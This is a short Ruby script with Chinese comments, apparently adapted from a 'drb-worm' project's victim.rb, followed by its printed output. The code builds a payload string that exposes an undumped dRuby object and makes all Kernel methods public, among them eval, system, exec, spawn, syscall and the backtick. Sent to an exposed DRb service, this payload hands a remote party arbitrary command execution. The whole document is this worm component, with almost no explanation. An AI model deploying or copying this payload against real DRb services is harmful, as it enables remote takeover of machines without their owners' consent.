#https://github.com/drbrain/drb-worm/blob/master/lib/drb/worm/victim.rb
# coding: utf-8
#一个ruby脚本,该脚本创建一个远程undumped对象提供必要的内核, methods public
puts -> {
  def remote_script
    script = []
    script << 'o = Object.new'
    script << 'class << o'
    script << 'extend DRb::DRbUndumped'

    methods = Kernel.methods(:false).sort - Kernel.instance_methods

    methods.each do |method|
      script << "public :#{method} rescue nil"
    end

    script << 'end'
    script << 'def o.const_get_id(name) Object.const_get(name).object_id end'
    script << 'def o.LOAD_PATH() DRb::DRbObject.new($LOAD_PATH) end'
    script << 'o'

    script.join "\n"
  end
  remote_script  

}[]

# ====> 输出
o = Object.new
class << o
  extend DRb::DRbUndumped
  public :! rescue nil
  public :!= rescue nil
  public :< rescue nil
  public :<= rescue nil
  public :== rescue nil
  public :> rescue nil
  public :>= rescue nil
  public :Array rescue nil
  public :Complex rescue nil
  public :Float rescue nil
  public :Hash rescue nil
  public :Integer rescue nil
  public :Rational rescue nil
  public :String rescue nil
  public :__callee__ rescue nil
  public :__dir__ rescue nil
  public :__id__ rescue nil
  public :__method__ rescue nil
  public :__send__ rescue nil
  public :` rescue nil
  public :abort rescue nil
  public :ancestors rescue nil
  public :at_exit rescue nil
  public :autoload rescue nil
  public :autoload? rescue nil
  public :binding rescue nil
  public :block_given? rescue nil
  public :caller rescue nil
  public :caller_locations rescue nil
  public :catch rescue nil
  public :class_eval rescue nil
  public :class_exec rescue nil
  public :class_variable_defined? rescue nil
  public :class_variable_get rescue nil
  public :class_variable_set rescue nil
  public :class_variables rescue nil
  public :const_defined? rescue nil
  public :const_get rescue nil
  public :const_missing rescue nil
  public :const_set rescue nil
  public :constants rescue nil
  public :equal? rescue nil
  public :eval rescue nil
  public :exec rescue nil
  public :exit rescue nil
  public :exit! rescue nil
  public :fail rescue nil
  public :fork rescue nil
  public :format rescue nil
  public :gets rescue nil
  public :global_variables rescue nil
  public :include rescue nil
  public :include? rescue nil
  public :included_modules rescue nil
  public :instance_eval rescue nil
  public :instance_exec rescue nil
  public :instance_method rescue nil
  public :instance_methods rescue nil
  public :iterator? rescue nil
  public :lambda rescue nil
  public :load rescue nil
  public :local_variables rescue nil
  public :loop rescue nil
public :method_defined? rescue nil
public :module_eval rescue nil
public :module_exec rescue nil
public :name rescue nil
public :open rescue nil
public :p rescue nil
public :prepend rescue nil
public :print rescue nil
public :printf rescue nil
public :private_class_method rescue nil
public :private_constant rescue nil
public :private_instance_methods rescue nil
public :private_method_defined? rescue nil
public :proc rescue nil
public :protected_instance_methods rescue nil
public :protected_method_defined? rescue nil
public :public_class_method rescue nil
public :public_constant rescue nil
public :public_instance_method rescue nil
public :public_instance_methods rescue nil
public :public_method_defined? rescue nil
public :putc rescue nil
public :puts rescue nil
public :raise rescue nil
public :rand rescue nil
public :readline rescue nil
public :readlines rescue nil
public :remove_class_variable rescue nil
public :require rescue nil
public :require_relative rescue nil
public :select rescue nil
public :set_trace_func rescue nil
public :singleton_class? rescue nil
public :sleep rescue nil
public :spawn rescue nil
public :sprintf rescue nil
public :srand rescue nil
public :syscall rescue nil
public :system rescue nil
public :test rescue nil
public :throw rescue nil
public :trace_var rescue nil
public :trap rescue nil
public :untrace_var rescue nil
public :warn rescue nil
end
def o.const_get_id(name) Object.const_get(name).object_id end
def o.LOAD_PATH() DRb::DRbObject.new($LOAD_PATH) end
o
